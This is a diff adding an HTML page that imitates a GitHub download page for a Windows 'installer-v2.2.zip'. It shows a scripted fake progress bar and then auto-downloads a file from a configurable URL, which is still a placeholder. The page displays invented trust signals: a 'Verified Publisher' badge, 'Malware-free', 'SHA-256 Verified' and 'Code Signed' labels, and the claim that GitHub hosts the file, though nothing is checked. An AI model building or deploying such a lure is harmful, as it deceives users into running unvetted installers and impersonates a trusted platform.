@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Download installer-v2.2.zip</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      background: #080c10;
+      background-image:
+        radial-gradient(ellipse 80% 50% at 50% -10%, rgba(35,134,54,.15) 0%, transparent 70%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      color: #e6edf3;
+      padding: 24px;
+    }
+
+    .topbar {
+      position: fixed; top: 0; left: 0; right: 0;
+      height: 52px;
+      background: rgba(13,17,23,.95);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid #21262d;
+      display: flex; align-items: center; justify-content: center;
+      z-index: 10;
+    }
+    .topbar svg { fill: #e6edf3; width: 28px; height: 28px; }
+
+    .card {
+      width: 100%; max-width: 560px;
+      background: #0d1117;
+      border: 1px solid #21262d;
+      border-radius: 16px;
+      overflow: hidden;
+      margin-top: 52px;
+      box-shadow: 0 0 0 1px rgba(255,255,255,.03),
+                  0 24px 64px rgba(0,0,0,.5),
+                  0 0 80px rgba(35,134,54,.05);
+    }
+
+    .publisher {
+      background: #080c10;
+      border-bottom: 1px solid #21262d;
+      padding: 11px 24px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .pub-badge {
+      display: flex; align-items: center; gap: 5px;
+      background: rgba(35,134,54,.12);
+      border: 1px solid rgba(35,134,54,.4);
+      border-radius: 20px; padding: 3px 12px;
+      color: #3fb950; font-size: 12px; font-weight: 600;
+    }
+    .pub-badge svg { width: 12px; height: 12px; fill: #3fb950; }
+    .pub-url { margin-left: auto; color: #484f58; font-size: 12px; }
+
+    .body { padding: 36px 32px 30px; }
+
+    .icon-wrap { display: flex; justify-content: center; margin-bottom: 20px; }
+    .icon-circle {
+      width: 60px; height: 60px;
+      background: rgba(35,134,54,.1);
+      border: 1.5px solid rgba(35,134,54,.5);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 24px rgba(35,134,54,.2), inset 0 0 12px rgba(35,134,54,.05);
+    }
+    .icon-circle svg { width: 28px; height: 28px; fill: #3fb950; }
+
+    h1 { text-align: center; font-size: 22px; font-weight: 700; color: #f0f6fc; margin-bottom: 8px; letter-spacing: -.3px; }
+    .subtitle { text-align: center; font-size: 13px; color: #484f58; margin-bottom: 28px; line-height: 1.5; }
+
+    .prog-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .prog-label { font-size: 12px; font-weight: 600; color: #8b949e; letter-spacing: .4px; text-transform: uppercase; }
+    .prog-pct   { font-size: 13px; font-weight: 700; color: #3fb950; font-variant-numeric: tabular-nums; }
+
+    .prog-track {
+      position: relative; height: 10px;
+      background: #161b22; border-radius: 99px; overflow: hidden;
+      border: 1px solid #21262d; margin-bottom: 8px;
+    }
+    .prog-glow {
+      position: absolute; inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(63,185,80,.18));
+      width: 0%; transition: width .05s linear; border-radius: 99px; filter: blur(4px);
+    }
+    .prog-fill {
+      position: absolute; top: 0; left: 0; bottom: 0; width: 0%;
+      background: linear-gradient(90deg, #1a7f37, #2ea043 40%, #3fb950);
+      border-radius: 99px; transition: width .05s linear; overflow: hidden;
+    }
+    .prog-fill::after {
+      content: ''; position: absolute; top: 0; bottom: 0; width: 60px;
+      background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.22) 40%, rgba(255,255,255,.35) 50%, rgba(255,255,255,.22) 60%, transparent 100%);
+      animation: shimmer 1.6s ease-in-out infinite;
+    }
+    @keyframes shimmer {
+      0%   { transform: translateX(-80px); }
+      100% { transform: translateX(calc(var(--bar-width, 560px) + 80px)); }
+    }
+    .prog-fill::before {
+      content: ''; position: absolute; top: 0; right: 0; bottom: 0; width: 4px;
+      background: rgba(255,255,255,.5); border-radius: 2px;
+      box-shadow: 0 0 8px 3px rgba(63,185,80,.8);
+      animation: edge-pulse 1s ease-in-out infinite alternate;
+    }
+    @keyframes edge-pulse {
+      from { opacity: .6; box-shadow: 0 0 6px 2px rgba(63,185,80,.6); }
+      to   { opacity: 1;  box-shadow: 0 0 14px 5px rgba(63,185,80,.95); }
+    }
+
+    .prog-meta { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 24px; }
+    .prog-status { color: #e6edf3; font-weight: 500; }
+    .prog-eta    { color: #484f58; }
+
+    .security {
+      background: rgba(35,134,54,.04);
+      border: 1px solid rgba(35,134,54,.2);
+      border-radius: 10px; padding: 16px 18px; margin-bottom: 18px;
+    }
+    .sec-title {
+      display: flex; align-items: center; gap: 7px;
+      font-size: 13px; font-weight: 600; color: #3fb950; margin-bottom: 12px;
+    }
+    .sec-title svg { width: 14px; height: 14px; fill: #3fb950; }
+    .sec-badges { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; }
+    .sec-badge {
+      display: flex; align-items: center; gap: 5px;
+      background: rgba(35,134,54,.08); border: 1px solid rgba(35,134,54,.25);
+      border-radius: 6px; padding: 5px 12px; font-size: 12px; color: #3fb950;
+    }
+    .sec-badge svg { width: 11px; height: 11px; fill: #3fb950; }
+
+    .file-row {
+      display: flex; align-items: center; gap: 14px;
+      background: #080c10; border: 1px solid #21262d;
+      border-radius: 10px; padding: 14px 16px; margin-bottom: 16px;
+    }
+    .file-icon svg { width: 30px; height: 30px; fill: #388bfd; }
+    .file-name { font-size: 14px; font-weight: 600; color: #f0f6fc; }
+    .file-meta { font-size: 12px; color: #484f58; margin-top: 3px; }
+
+    .btn-dl {
+      display: flex; align-items: center; justify-content: center; gap: 9px;
+      width: 100%;
+      background: linear-gradient(180deg, #2ea043, #238636);
+      border: 1px solid rgba(63,185,80,.4); border-radius: 8px; color: #fff;
+      font-size: 15px; font-weight: 700; padding: 14px; cursor: pointer; text-decoration: none;
+      transition: filter .15s, box-shadow .15s;
+      box-shadow: 0 1px 0 rgba(255,255,255,.1) inset, 0 4px 16px rgba(35,134,54,.25);
+    }
+    .btn-dl:hover { filter: brightness(1.1); box-shadow: 0 1px 0 rgba(255,255,255,.1) inset, 0 6px 24px rgba(35,134,54,.4); }
+    .btn-dl svg { width: 18px; height: 18px; fill: #fff; }
+
+    .fine-print { font-size: 11px; color: #30363d; text-align: center; margin-top: 14px; line-height: 1.6; }
+    .fine-print a { color: #388bfd; text-decoration: none; }
+    .fine-print a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+  <svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+</div>
+
+<div class="card">
+  <div class="publisher">
+    <div class="pub-badge">
+      <svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>
+      Verified Publisher
+    </div>
+    <span class="pub-url">github.com/downloader</span>
+  </div>
+
+  <div class="body">
+    <div class="icon-wrap">
+      <div class="icon-circle">
+        <svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>
+      </div>
+    </div>
+
+    <h1 id="heading">Preparing your download…</h1>
+    <p class="subtitle" id="subtext">Your archive is being generated and will be ready shortly.</p>
+
+    <div class="prog-header">
+      <span class="prog-label" id="prog-label">Downloading</span>
+      <span class="prog-pct" id="prog-pct">0%</span>
+    </div>
+    <div class="prog-track">
+      <div class="prog-glow" id="glow"></div>
+      <div class="prog-fill" id="fill"></div>
+    </div>
+    <div class="prog-meta">
+      <span class="prog-status" id="prog-status">Starting…</span>
+      <span class="prog-eta"    id="prog-eta">Estimated time: —</span>
+    </div>
+
+    <div class="security">
+      <div class="sec-title">
+        <svg viewBox="0 0 16 16"><path d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.183 2.065 5.744 5.533 6.943a1.75 1.75 0 00.933 0C10.935 13.744 13 11.183 13 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133zm-.61 1.429a.25.25 0 01.153 0l5.25 1.68a.25.25 0 01.174.238V8c0 2.67-1.739 4.913-4.686 5.894a.25.25 0 01-.133 0C5.739 12.913 4 10.67 4 8V3.48a.25.25 0 01.174-.238l5.25-1.68z"/></svg>
+        Security Verification Passed
+      </div>
+      <div class="sec-badges">
+        <span class="sec-badge"><svg viewBox="0 0 16 16"><path d="M8.533.133a1.75 1.75 0 00-1.066 0l-5.25 1.68A1.75 1.75 0 001 3.48V8c0 3.183 2.065 5.744 5.533 6.943a1.75 1.75 0 00.933 0C10.935 13.744 13 11.183 13 8V3.48a1.75 1.75 0 00-1.217-1.667L8.533.133z"/></svg>Malware-free</span>
+        <span class="sec-badge"><svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>SHA-256 Verified</span>
+        <span class="sec-badge"><svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>Code Signed</span>
+        <span class="sec-badge"><svg viewBox="0 0 16 16"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>Open Source</span>
+      </div>
+    </div>
+
+    <div class="file-row">
+      <div class="file-icon"><svg viewBox="0 0 16 16"><path d="M3.75 1.5a.25.25 0 00-.25.25v11.5c0 .138.112.25.25.25h8.5a.25.25 0 00.25-.25V6H9.75A1.75 1.75 0 018 4.25V1.5H3.75zm5.75.56v2.19c0 .138.112.25.25.25h2.19L9.5 2.06zM2 1.75C2 .784 2.784 0 3.75 0h5.086c.464 0 .909.184 1.237.513l3.414 3.414c.329.328.513.773.513 1.237v8.086A1.75 1.75 0 0112.25 15h-8.5A1.75 1.75 0 012 13.25V1.75z"/></svg></div>
+      <div>
+        <div class="file-name">installer-v2.2.zip</div>
+        <div class="file-meta">Signed &nbsp;·&nbsp; 12.4 MB &nbsp;·&nbsp; Windows x64</div>
+      </div>
+    </div>
+
+    <a class="btn-dl" id="btn" href="#" onclick="return false;">
+      <svg viewBox="0 0 16 16"><path d="M7.47 10.78a.75.75 0 001.06 0l3.75-3.75a.75.75 0 00-1.06-1.06L8.75 8.44V1.75a.75.75 0 00-1.5 0v6.69L4.78 5.97a.75.75 0 00-1.06 1.06l3.75 3.75zM3.75 13a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5z"/></svg>
+      Download installer-v2.2.zip
+    </a>
+
+    <p class="fine-print">
+      Files are hosted by GitHub, Inc. &nbsp;·&nbsp;
+      By downloading you agree to the <a href="#">Terms of Service</a>.
+    </p>
+  </div>
+</div>
+
+<script>
+  // ── CONFIG ─────────────────────────────────────────────────────
+  const DOWNLOAD_URL = "REPLACE_WITH_WINDOWS_DOWNLOAD_URL";
+  // ───────────────────────────────────────────────────────────────
+
+  const fill   = document.getElementById('fill');
+  const glow   = document.getElementById('glow');
+  const pctEl  = document.getElementById('prog-pct');
+  const statEl = document.getElementById('prog-status');
+  const etaEl  = document.getElementById('prog-eta');
+
+  const segments = [
+    { target: 18,  duration: 400,  label: 'Connecting…',        eta: 'Estimated time: 4s' },
+    { target: 38,  duration: 600,  label: 'Verifying package…', eta: 'Estimated time: 3s' },
+    { target: 55,  duration: 800,  label: 'Generating…',        eta: 'Estimated time: 2s' },
+    { target: 71,  duration: 400,  label: 'Signing…',           eta: 'Estimated time: 2s' },
+    { target: 88,  duration: 700,  label: 'Almost ready…',      eta: 'Estimated time: 1s' },
+    { target: 100, duration: 400,  label: 'Ready.',              eta: 'Estimated time: 0s' },
+  ];
+
+  let current = 0, segIdx = 0, startTime = null, startPct = 0;
+
+  function easeInOut(t) { return t < 0.5 ? 4*t*t*t : 1-Math.pow(-2*t+2,3)/2; }
+
+  function setBar(pct) {
+    fill.style.width = pct + '%';
+    glow.style.width = pct + '%';
+    fill.style.setProperty('--bar-width', (fill.offsetWidth || 500) + 'px');
+    pctEl.textContent = Math.round(pct) + '%';
+  }
+
+  function runSegment(ts) {
+    if (segIdx >= segments.length) return;
+    const seg = segments[segIdx];
+    if (!startTime) { startTime = ts; startPct = current; statEl.textContent = seg.label; etaEl.textContent = seg.eta; }
+    const elapsed = ts - startTime;
+    const t = Math.min(elapsed / seg.duration, 1);
+    const pct = startPct + (seg.target - startPct) * easeInOut(t);
+    setBar(pct); current = pct;
+    if (t < 1) { requestAnimationFrame(runSegment); }
+    else {
+      segIdx++; startTime = null;
+      if (segIdx < segments.length) { setTimeout(() => requestAnimationFrame(runSegment), 80 + Math.random()*100); }
+      else { onComplete(); }
+    }
+  }
+
+  function onComplete() {
+    document.getElementById('heading').textContent = 'Your download is ready!';
+    document.getElementById('subtext').textContent = "If it didn't start automatically, click the button below.";
+    const btn = document.getElementById('btn');
+    btn.onclick = function(e){ e.preventDefault(); go(); return false; };
+    go();
+  }
+
+  function go() {
+    if (DOWNLOAD_URL === "REPLACE_WITH_WINDOWS_DOWNLOAD_URL") return;
+    const a = document.createElement('a');
+    a.href = DOWNLOAD_URL; a.download = '';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }
+
+  setTimeout(() => requestAnimationFrame(runSegment), 500);
+</script>
+</body>
+</html>
